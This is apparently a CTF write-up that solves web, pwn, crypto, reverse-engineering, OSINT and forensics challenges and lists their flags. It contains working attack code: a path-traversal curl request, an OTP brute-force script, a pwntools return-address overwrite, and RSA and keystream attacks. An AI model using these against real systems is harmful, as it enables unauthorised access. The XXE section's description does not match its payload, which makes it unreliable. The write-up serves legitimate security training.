

## RICK - WEB

I identified an **XXE vulnerability** in the `/data` endpoint. The `main.py` code uses `lxml`'s `ET.XMLParser(resolve_entities=True)`, which is prone to XXE. By providing an XML payload that includes an external entity declaration, I was able to read local files.

- auth.py

```python
@auth.route('/data', methods=['POST'])
def process_data():
    # Decode the incoming XML data
    xml_data = request.data.decode('utf-8')
    parser = ET.XMLParser(resolve_entities=True)
    root = ET.fromstring(xml_data, parser=parser)
    try:
        # Parse XML data with lxml, allowing external entity resolution
        # Enable external entity resolution
        # parser = ET.XMLParser(resolve_entities=True)
        #  Parse the XML with XXE vulnerability enabled
        # root = ET.fromstring(xml_data, parser=parser)

        # Extract the user ID from the XML
        user_id = root.find('ID').text
        print(user_id)
        details = open(f'static/details/{user_id.strip()}').read()
    except ET.XMLSyntaxError:
        # If parsing fails, return the raw XML (this simulates error handling)
        details = __import__('os').getcwd()
    except:
        details = f"Current working directory: {__import__('os').getcwd()}"

    response = make_response(details)
    return response
                        
```


My successful payload used the following `curl` command to retrieve the contents of `/app/.flag`:


```
curl -X POST http://4.240.104.200:5004/data \
-H "Content-Type: application/xml" \
--data '<?xml version="1.0"?><data><ID>../../../../app/.flag</ID></data>'
```

---

## AGAIN CRYPTO

This challenge involved recovering a flag from two ciphertext-keystream pairs. I used a Python script that implements the XOR logic to recover the keystream using a known plaintext and then applies that keystream to the flag's ciphertext to reveal the flag.

Here's the Python script I used:



```python
from Crypto.Cipher import ARC4
import binascii

def xor_bytes(byte_seq1, byte_seq2):
    """XOR two byte sequences of equal length."""
    return bytes([b1 ^ b2 for b1, b2 in zip(byte_seq1, byte_seq2)])

# Hex-encoded ciphertext of the flag
flag_ciphertext_hex = "70cb56bc40d8c59485eb174afa1fc998984de858e6e642d9526ccfda12"

# Hex-encoded ciphertext of a known plaintext (chosen ciphertext attack)
known_ciphertext_hex = "79de558663ade6ac9bd8353fe46fbf84b33dd928fac331e84e56bcec2c98"

# Convert hex strings to byte arrays
flag_ciphertext = bytes.fromhex(flag_ciphertext_hex)
known_ciphertext = bytes.fromhex(known_ciphertext_hex)

# The known plaintext used to generate 'known_ciphertext'
# 14 'A's followed by 16 'C's
known_plaintext = b"A" * 14 + b"C" * 16

# Recover the RC4 keystream by XORing the known ciphertext and plaintext
rc4_keystream = xor_bytes(known_ciphertext, known_plaintext)

# Decrypt the flag by XORing its ciphertext with the recovered keystream
recovered_flag = xor_bytes(flag_ciphertext, rc4_keystream)

# Print the recovered flag
print("Recovered flag:", recovered_flag)

```

---

## OSINT - King's Crossing

I approached this OSINT challenge by combining visual cues with the provided hints. The image prominently featured a **KSRTC bus**, immediately suggesting the location was in **Karnataka, India**. The challenge description's mention of "King" and "Palace" led me to focus on famous palaces within Karnataka.

I then cross-referenced these famous palaces with nearby textile shops, as implied by the image. My search indicated a strong match near the **Mysore Palace**. Further investigation confirmed the exact address:

**Address**: No.67, Kille Mohalla, 1A, Sayyaji Rao Rd, near Agrahara, Agrahara, circle, Mysuru, Karnataka 570004

---

## WRONG - REV

This reverse engineering challenge involved deciphering a custom RC4-like encryption. I reconstructed the initialization and shuffling phases of the algorithm, then used these to XOR with the given `local_278` array to recover the original input (the flag).

Here's the decryption logic I used:



```python
def rc4_init(key_bytes):
    """Perform RC4 key-scheduling algorithm (KSA) with the provided key."""
    sbox = list(range(256))  # Initialize S-box with values 0–255
    j = 0
    for i in range(256):
        j = (j + sbox[i] + key_bytes[i % len(key_bytes)]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]  # Swap values
    return sbox

def custom_shuffle(sbox):
    """
    Perform a custom shuffle on the S-box.
    Only iterates 28 times instead of the usual RC4 PRGA.
    """
    i = 0
    j = 0
    for count in range(28):
        i = (i + 1) % 256
        j = (j + sbox[i]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]
    return sbox

def xor_decrypt(sbox, ciphertext_bytes):
    """
    Decrypt the ciphertext by XORing each byte with corresponding S-box value.
    Assumes S-box was modified using a custom RC4-based process.
    """
    return bytes([ciphertext_bytes[i] ^ sbox[i] for i in range(len(ciphertext_bytes))])

# RC4 key as a list of byte values
rc4_key = [0xad, 0xde, 0xde, 0xc0, 0xad, 0xde, 0xde, 0xc0]

# The encrypted data (28 bytes)
encrypted_bytes = [
    0x5a, 0xe3, 0xd9, 0x62, 0x22, 0x9f, 0x59, 0xc9,
    0xe2, 0x18, 0xd1, 0x37, 0xe7, 0xf7, 0x3e, 0x66,
    0xea, 0x88, 0x33, 0x44, 0x6c, 0x73, 0x85, 0x16,
    0x5d, 0x6c, 0xef, 0xa3
]

# Run RC4 key scheduling
sbox = rc4_init(rc4_key)

# Apply the 28-round custom shuffle
shuffled_sbox = custom_shuffle(sbox)

# Recover the original input by XORing with the modified S-box
decrypted_output = xor_decrypt(shuffled_sbox, encrypted_bytes)

# Display the recovered input (safely decoding bytes)
print("Recovered input:", decrypted_output.decode(errors="replace"))

```

---

## Lousy 2FA

First, I checked `/robots.txt`, which revealed the `/forgot-password` endpoint. Examining the `script.js` file associated with the forgot password functionality, I found the `fetch` request to `/send-otp`:



```js
fetch('/send-otp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: emailInput.value,
        // length: 8 // This was commented out
    }),
})
```

The commented-out `length: 8` was a crucial hint. It suggested that while an 8-digit OTP was initially intended, the server might accept shorter lengths. I then used a Python script to brute-force OTPs of varying lengths, starting from 1, by sending requests to `/verify-otp`.

Here's my brute-forcing script:



```python
import requests

# URL of the OTP verification endpoint
url = "http://4.240.104.200:5003/verify-otp"

# Try OTP values from 0 to 99
for otp_value in range(100):
    payload = {
        "email": "admin@example.com",
        "otp": str(otp_value)  # Convert OTP to string
    }

    # Send the POST request with JSON payload
    response = requests.post(url, json=payload)

    # Check response text for success (anything not containing "Invalid")
    if "Invalid" not in response.text:
        print(f"[+] OTP found: {otp_value}")
        print("Server response:", response.text)
        break  # Stop after finding the correct OTP

```

**Flag**: HTB{L3NGTH_D0E5NT_MATT3R_0R_D03S_1T?}

---

## TIP TOP PWN

This pwn challenge required exploiting a buffer overflow to hijack control flow. Analyzing the `tiptop` binary, I identified a format string vulnerability or similar overflow where I could overwrite the return address. My goal was to call the `magiccolour` function.

Here's the `pwntools` exploit script I used:



```python
from pwn import *

# Load the ELF binary and set context
elf = context.binary = ELF('./tiptop')
context.terminal = ['kitty', '-e']  # Change this if you use a different terminal emulator

# GDB debugging script: set breakpoints at main and magic_menu
gdb_script = '''
b *main
b *magic_menu
'''

# Set up process based on execution context
if args.REMOTE:
    p = remote('4.240.104.200', 6974)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript=gdb_script)
else:
    p = process(elf.path)

# ========== Exploit Details ========== #

# Buffer overflow: Overflow 72 bytes to reach return address
# Add a 'ret' instruction to align the stack (needed on some systems for ROP)
ret_gadget = 0x401016

# Target function we want to call
target_function = elf.sym['magiccolour']

# Construct payload: padding + ret + target address
payload = b'A' * 72 + p64(ret_gadget) + p64(target_function)

# Interact with the menu and trigger the overflow
p.recvuntil(b'5. Orange\n')     # Wait until menu options are printed
p.sendline(b'4')                # Choose option 4 to reach the vulnerable code path
p.sendline(payload)            # Send our crafted payload

# Get interactive shell or output
p.interactive()

```

---

## Tic Tac Toe - Web

Playing the Tic Tac Toe game normally showed that the server would always cheat, making it impossible to win. I then intercepted the `/move_1` request in Burp Suite:



```json
{
    "game_id": "20b3290a-c",
    "row": 0,
    "col": 0,
    "moveNo": 1
}
```

By experimenting with the `row` and `col` values, I discovered that the server behaved unexpectedly when negative values were supplied. By submitting carefully crafted requests with negative row or column values, I was able to manipulate the game state to achieve a score of 3, after which I could successfully call the `/submit_score_3` endpoint to retrieve the flag.

For example, a request with a negative row:



```json
{
    "game_id": "20b3290a-c",
    "row": -1,
    "col": 0,
    "moveNo": 1
}
```

**Flag**: HTB{tw000_g00d_f0ur_r34l?_8784703363}

---

## Echoes of Awa - Crypto

The challenge presented a string encoded with "awa" and "awawawa." I deduced that "awa" represented '0' and "awawawa" represented '1'. The string was also reversed and then char-shifted.

My solution involved two main steps:

1. **Decoding "awa" language**: I replaced "awawawa" with '1' and "awa" with '0', then reversed the resulting binary string and converted it to ASCII characters.
2. **Brute-forcing shift**: The resulting string was still unreadable, indicating a character shift cipher. I brute-forced all possible ASCII shifts (0-127) to find the correct flag.

Here's the Python script I used:



```python
def decrypt_awa(encrypted: str) -> str:
    """
    Decrypts a string of 'awa' and 'awawawa' tokens.
    - 'awa' represents binary 0
    - 'awawawa' represents binary 1
    - Each token is reversed before converting to ASCII
    """
    decrypted_text = ""
    for token in encrypted.strip().split(" "):
        # Replace 'awawawa' with '1', 'awa' with '0', then reverse the bit string
        binary_string = token.replace("awawawa", "1").replace("awa", "0")[::-1]
        char = chr(int(binary_string, 2))  # Convert binary to character
        decrypted_text += char
    return decrypted_text

def brute_force_shifted_flag(shifted_flag: str):
    """
    Brute-forces all possible Caesar-style shifts (mod 128) to reverse an obfuscation.
    Each character is shifted backward by values from 0 to 127.
    """
    for shift in range(128):
        candidate = ''.join(chr((ord(char) - shift) % 128) for char in shifted_flag)
        print(f"Shift {shift:3}: {candidate}")

# The obfuscated ciphertext using 'awa' encoding
encrypted_ct = """
awawawaawaawawawaawawawaawaawaawawawaawa awawawaawaawaawawawaawawawaawaawawawaawa 
awawawaawawawaawawawaawaawaawaawawawaawa awaawaawaawaawaawaawaawa 
awawawaawawawaawaawaawawawaawaawawawaawa awawawaawaawawawaawaawawawaawawawaawaawa 
awaawaawawawaawawawaawawawaawawawaawaawa awaawaawawawaawaawaawawawaawawawaawa 
awawawaawaawaawawawaawawawaawawawaawaawa awawawaawaawaawaawawawaawawawaawawawaawa 
awawawaawaawaawaawawawaawawawaawawawaawa awaawaawawawaawaawaawawawaawawawaawa 
awaawaawaawawawaawaawaawawawaawa awawawaawawawaawawawaawaawawawaawawawaawawawaawa 
awaawawawaawawawaawawawaawawawaawawawaawawawaawa awawawaawaawawawaawaawawawaawawawaawawawaawa 
awaawaawawawaawawawaawawawaawawawaawaawa awawawaawaawawawaawaawawawaawawawaawaawa
"""

# Step 1: Decode the awa/awawawa representation
shifted_flag = decrypt_awa(encrypted_ct)

# Step 2: Try all 128 Caesar-style ASCII shifts
brute_force_shifted_flag(shifted_flag)

```

**Flag**: HTB{N07_4ll_Cryp70_15_UnBr34k4bl3}

---

## PAIN REVERSE

This reverse engineering challenge involved an anti-debugging mechanism and a custom decryption logic. After bypassing the anti-debugging and extracting the main function, I analyzed the decryption routine. The flag was obtained by XORing `expected_stack_values_raw` with characters from two keys, `K1` and `K3`, based on their lengths.

Here's the decryption script I used:



```python
# Expected stack values, likely from reversing or debugging the binary
expected_stack_values = [
    0x4e, 0x7f, 0x79, 0x7f, 0x10, 0x7e, 0x08, 0x61, 0x7d, 0x1a, 0x33, 0x45, 0x16, 0x7a, 0x51, 0x77,
    0x5f, 0x43, 0x0d, 0x40, 0x37, 0x6b, 0x28, 0x67, 0x35, 0x51, 0x6f, 0x06, 0x46, 0x6e, 0x29, 0x2b,
    0x66
]

# Two XOR keys used in transformation
key1 = "IDKwhyIamD0ingThis"
key3 = "Oops"

key1_len = len(key1)
key3_len = len(key3)
flag_len = len(expected_stack_values)

# List to hold recovered flag characters
recovered_flag = []

# Recover each character from the stack values
for i in range(flag_len):
    encrypted_byte = expected_stack_values[i]
    
    key3_char = ord(key3[i % key3_len])
    key1_char = ord(key1[i % key1_len])

    # Reverse the XOR operations
    intermediate = encrypted_byte ^ key3_char
    flag_char = intermediate ^ key1_char

    recovered_flag.append(chr(flag_char))

# Output the reconstructed flag
flag = ''.join(recovered_flag)
print("Recovered Flag:", flag)

```

---

## Ciao Detective 1

I began by analyzing the `secret.pcap` file. Most HTTP requests appeared to be garbage. However, I found Base64 encoded messages within TCP requests directed to `192.168.13.37` (excluding HTTP traffic). I extracted these data fields using `tshark`:



```bash
tshark -Y "tcp && ip.addr == 192.168.13.37 && !(http)" -T fields -e data -r secret.pcap > flag
```

Next, I attempted to decode the Base64 data in Python. Some messages failed to decode, hinting at encryption. Further investigation and a hint from ChatGPT suggested `cryptography.fernet` encryption. I then revisited the pcap file and located a single request to a different IP that contained the secret key. With the key, I could decrypt the remaining messages. The decrypted content, when Base64 decoded, turned out to be PNG image data, which I wrote to files.

Here's my Python script for extraction and decryption:



```python
import base64
from cryptography.fernet import Fernet
import os

# Secret Fernet key recovered  from PCAP
fernet_key = b'SwossJsjDe1x3CqJrht-iKhPWagx1bam6Q5zBI0R4nI='
fernet = Fernet(fernet_key)

# Create output directory if it doesn't exist
output_dir = "outputs"
os.makedirs(output_dir, exist_ok=True)

image_counter = 0

# Read and process each line from the "flag" file
with open("flag", "r") as file:
    for line in file:
        line = line.strip()
        if len(line) < 2:
            continue  # Skip empty or short lines
        
        try:
            # Try decoding line as base64-wrapped text
            decoded = base64.b64decode(bytes.fromhex(line)).decode()
            print(decoded)
        except Exception:
            try:
                # If that fails, try decrypting with Fernet
                decrypted = fernet.decrypt(bytes.fromhex(line))
                image_data = base64.b64decode(decrypted)

                # Save image to outputs/ folder
                output_path = os.path.join(output_dir, f"{image_counter}.png")
                with open(output_path, "wb") as img_file:
                    img_file.write(image_data)
                
                image_counter += 1
            except Exception:
                print("Error processing line:", line)
                continue

```

The resulting PNG images revealed the flag.

**Flag**: HTB{a1c0hol_i5_bad_f0r_y0u}

---

## Thala for a reason - Forensics

I started by examining the `Thala.ad1` forensics image. After exporting all files, I found several PDF files: `flag1.pdf`, `flag2.pdf`, `flag3.pdf`, `flag5.pdf`, `flag6.pdf`, and `reason.pdf`. All were corrupted except `reason.pdf`, which was password-protected. The challenge description, "You Know they say 'THALA FOR A REASON'. I want you to dive in the files, and get me the reason," clearly pointed to `reason.pdf`.

Upon re-enumerating the files within the `thala.ad1` image, I discovered two additional files: `flag7.pdf` and `flag.txt`. Inside `flag.txt`, I found a hash for `flag7-protected.pdf`:

`flag7-protected.pdf:$pdf$4*4*128*-4*1*16*26bf130a2721320b36416d212cfead8b*32*bb481f01ebd346bb61f9e08084c071fd28bf4e5e4e758a4164004e56fffa0108*32*6cb92a42d70885877620e626b05162599ff277538d92968832fe7d1e0e22d4be`

I used a PDF cracker (e.g., `pdf2john.py` then `john` or `hashcat`) to crack this hash, which yielded the password: `iloveyou`. This password unlocked `flag7.pdf`, revealing the first flag.

I then used the same password, `iloveyou`, to unlock `reason.pdf`, which contained the second flag.

Flag from flag7.pdf: HTB{D4Mn_%_N11G433}

Flag from reason.pdf: HTB{y0U_f0U4D_FT13_REASON}

---

## A Message From Professor - Misc

The hint, "Rebellion Bleeds through red but not on the surface. Look past the first ripple. The second wave carries the message," strongly suggested examining the red color channel in the provided image. I explored the bit planes of the image. While most layers appeared uniform, the **red layer 2** showed a subtle border around a figure, indicating hidden data. Extracting data from this specific bit plane revealed the flag.

A hexdump of the extracted data showed:


```
........  ........  ..}!74am  $_$!_40$  $ef04P{B  TH......  ........
```

Concatenating the relevant parts revealed the flag.

**Flag**: `HTB{P40fe$$04_!$_$ma47!}`

---

## RSA 1 - Crypto

I was given `n` and `ciphertext`. Initially, I tried the common public exponent `e=65537`, but it yielded a bad decryption. I also attempted XORing the provided hex string `20657865737c737c74` with the ciphertext (both before and after decryption), but that didn't work either.

Through brute-forcing potential XOR keys with the provided hex string, I discovered that XORing it with the ASCII character 'E' (0x45) resulted in `e = 69691`. This value, interestingly, is "69691" which could be a playful hint ("nice"). Using this public exponent, `e = 69691`, along with the given `n` and `ciphertext`, allowed for successful decryption of the RSA message.

**Flag**: HTB{rsa_seems_cool_heh}

---

## Deep Dive - Forensics

The challenge involved a file named `DeepDive.xlsx`. My first step was to check for macros and change the color of all cells within the spreadsheet to reveal any hidden content.

Next, I unzipped the `.xlsx` file, as Excel files are essentially ZIP archives.



```
┌──(l4tmur㉿NOVA)-[/mnt/…/CTF/csecindia-25/Forensics/deepdive]
└─$ unzip DeepDive.xlsx
Archive:  DeepDive.xlsx
  inflating: docProps/app.xml
  inflating: docProps/core.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/sheet2.xml
  inflating: xl/worksheets/sheet3.xml
  inflating: xl/worksheets/sheet4.xml
  inflating: xl/styles.xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: [Content_Types].xml
```

The unzipped contents revealed four `sheetX.xml` files, indicating that there were three hidden sheets in addition to the visible one. Upon analyzing all four XML files, I found a series of hidden fields that started with `UGO{`. This immediately looked suspicious, as it resembled the `HTB{` flag format.

I extracted all these hidden fields and arranged them in order:

`UGO{jul_vg0_9yj9l0_s5e8a0hpx0}`

Recognizing the pattern of character substitution, I applied a **ROT13** cipher to this string, which successfully decoded it into the flag.

**FLAG**: HTB{why_it5_4lw4y5_f0r3n5uck5}

---

## RSA 2

This challenge presented multiple RSA moduli (`n`) and corresponding ciphertexts (`c`) with a small public exponent `e = 4`. This is a classic **RSA broadcast attack** scenario. My goal was to recover the message `m` where ci​=me(modni​) for several pairs of (ni​,ci​).

My strategy involved two main steps:

1. **Chinese Remainder Theorem (CRT)**: I combined the congruences to find me(modN), where N is the product of all moduli.
2. **e-th Root**: Since e is small, taking the e-th root of the result from CRT (which is me) directly yielded m.

Here's the Python script I used, leveraging the `Crypto.Util.number` and `sympy` libraries:



```python
from Crypto.Util.number import long_to_bytes
from sympy import mod_inverse, integer_nthroot
from functools import reduce

# Public exponent
e = 4

# === Step 0: Replace with actual values ===
moduli = []        # List of n values
ciphertexts = []   # Corresponding list of c values

# === Step 1: Compute product of all moduli ===
N = reduce(lambda x, y: x * y, moduli)

# === Step 2: Apply the Chinese Remainder Theorem ===
def chinese_remainder(ciphertexts, moduli):
    total = 0
    for i in range(len(moduli)):
        ni = moduli[i]
        ci = ciphertexts[i]
        Ni = N // ni
        inverse = mod_inverse(Ni, ni)
        total += ci * Ni * inverse
    return total % N

# Compute m^e using CRT across all ciphertexts and moduli
m_pow_e = chinese_remainder(ciphertexts, moduli)

# === Step 3: Take the e-th root to retrieve original message m ===
m_root, is_exact = integer_nthroot(m_pow_e, e)
if not is_exact:
    print("[!] Warning: Integer root not exact – padding or noise may be present.")

# === Step 4: Convert integer message to bytes ===
try:
    recovered_message = long_to_bytes(m_root).decode()
    print("Recovered message:", recovered_message)
except Exception:
    print("Recovered (raw bytes):", long_to_bytes(m_root))

```

**Flag**: HTB{4n0th3r_e45y_p345y_rs4_qs}

---

## RSA 3

This challenge provided a single modulus `n`, two ciphertexts `c1` and `c2`, and their corresponding exponents `e1` and `e2`. This is a classic **common modulus attack** scenario. I verified that gcd(e1,e2)=1, which is a prerequisite for this attack.

The steps I followed for the common modulus attack are:

1. Verify that gcd(e1​,e2​)=1.
2. Use the Extended Euclidean Algorithm to find integers s1​ and s2​ such that s1​e1​+s2​e2​=1.
3. Recover the message m using the property: m≡(c1s1​​⋅c2s2​​)(modn). Since s1​ or s2​ could be negative, I used the modular inverse of the corresponding ciphertext when needed.

Here's the Python script I used to implement this attack:



```python
from Crypto.Util.number import inverse, long_to_bytes
from math import gcd

# === Replace these with actual values ===
n = None       # RSA modulus (same for both ciphertexts)
c1 = None      # Ciphertext encrypted with e1
c2 = None      # Ciphertext encrypted with e2
e1 = 0x1337    # First public exponent
e2 = 0x1731    # Second public exponent

# === Step 1: Ensure e1 and e2 are coprime ===
assert gcd(e1, e2) == 1, "Exponents must be coprime for Common Modulus Attack to work."

# === Step 2: Extended Euclidean Algorithm to find s1 and s2 ===
def extended_gcd(a, b):
    if b == 0:
        return (1, 0, a)
    x1, y1, gcd_val = extended_gcd(b, a % b)
    x, y = y1, x1 - (a // b) * y1
    return (x, y, gcd_val)

s1, s2, _ = extended_gcd(e1, e2)

# === Step 3: Compute m = (c1^s1 * c2^s2) mod n ===
# If si < 0, use modular inverse: c^(-si) ≡ inverse(c)^|si| mod n
m1 = pow(c1, s1, n) if s1 >= 0 else pow(inverse(c1, n), -s1, n)
m2 = pow(c2, s2, n) if s2 >= 0 else pow(inverse(c2, n), -s2, n)

m = (m1 * m2) % n

# === Step 4: Decode recovered plaintext ===
try:
    print("Recovered message:", long_to_bytes(m).decode())
except:
    print("Recovered (raw bytes):", long_to_bytes(m))

```

**Flag**: HTB{c0mm0n_m0du1u5_4774ck_1337_1731}